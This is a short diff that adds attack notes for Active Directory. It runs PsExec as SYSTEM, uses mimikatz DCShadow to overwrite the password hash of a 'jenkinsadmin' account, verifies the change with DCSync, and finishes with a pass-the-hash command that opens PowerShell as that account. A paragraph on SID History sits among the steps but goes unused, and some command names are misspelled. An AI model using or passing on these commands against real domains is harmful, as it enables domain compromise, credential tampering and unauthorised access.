@@ -1,0 +1,23 @@
+#run as system
+PsExec.exe -i -s cmd 
+
+SID History is an attribute that supports migration scenarios. Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the account has when connecting to resources. SID History enables access for another account to effectively be cloned to another and is extremely useful to ensure users retain access when moved (migrated) from one domain to another.
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:jenkinsadmin /attribute:unicodePwd /value:00000000000000000000000000000000
+
+
+#open cmd as admin
+#see the hash
+lsdump:dcsync /user:jenkinsadmin
+
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
+
+#see the changed hash
+lsdump:dcsync /user:jenkinsadmin
+
+---------------Pass the hash attack------------
+sekurlsa::pth /user:jenkinsadmin /domain: /ntlm:00000000000000000000000000000000 /run:powershell.exe
